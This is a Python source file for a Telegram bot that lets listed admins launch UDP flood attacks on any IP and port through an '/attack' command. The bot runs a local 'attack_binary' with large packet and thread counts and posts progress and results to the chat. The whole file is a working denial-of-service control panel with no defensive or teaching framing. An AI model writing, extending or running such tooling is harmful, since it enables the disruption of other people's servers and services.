
import os
import subprocess
import logging
import json
import time
from telebot import TeleBot
from telebot.types import Message

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger()

# Load configuration from config.json
CONFIG_FILE = "config.json"
with open(CONFIG_FILE, "r") as file:
    config = json.load(file)

BOT_TOKEN = config["BOT_TOKEN"]
ADMIN_IDS = config["ADMIN_IDS"]

# Path to the compiled attack binary
BINARY_PATH = "./attack_binary"

# System capacity-based settings
MAX_PACKET_SIZE = 8192  # Adjust based on your system's capability
MAX_THREAD_COUNT = 5000  # Adjust based on your system's capability

# Initialize Telegram bot
bot = TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start(message: Message):
    """Handle /start command."""
    user_id = message.from_user.id
    if user_id in ADMIN_IDS:
        bot.reply_to(message, "Welcome, Admin! Use /attack <IP> <Port> <Duration> to launch a UDP attack.")
    else:
        bot.reply_to(message, "You are not authorized to use this bot.")

@bot.message_handler(commands=['attack'])
def attack(message: Message):
    """Handle /attack command to execute the binary."""
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "You are not authorized to use this command.")
        return

    try:
        # Parse the command arguments
        args = message.text.split()
        if len(args) != 4:
            bot.reply_to(message, "Invalid command format. Use /attack <IP> <Port> <Duration>.")
            return

        target_ip = args[1]
        target_port = int(args[2])
        duration = int(args[3])

        # Notify start
        bot.reply_to(message, f"Launching UDP attack on {target_ip}:{target_port} for {duration} seconds...")

        # Execute the binary
        command = [BINARY_PATH, target_ip, str(target_port), str(duration), str(MAX_PACKET_SIZE), str(MAX_THREAD_COUNT)]
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Periodic updates
        for i in range(duration):
            time.sleep(1)  # Send updates every second
            bot.send_message(message.chat.id, f"Attack in progress... {i + 1}/{duration} seconds elapsed.")

        stdout, stderr = process.communicate()

        if process.returncode == 0:
            bot.reply_to(message, f"UDP attack completed successfully on {target_ip}:{target_port} with PacketSize={MAX_PACKET_SIZE} and ThreadCount={MAX_THREAD_COUNT}.\nOutput:\n{stdout.decode()}")
        else:
            bot.reply_to(message, f"Error occurred:\n{stderr.decode()}")

    except Exception as e:
        logger.error(f"Error: {e}")
        bot.reply_to(message, f"An error occurred: {e}")

if __name__ == "__main__":
    logger.info("Bot is running...")
    bot.polling(non_stop=True, interval=0, timeout=30, long_polling_timeout=20)
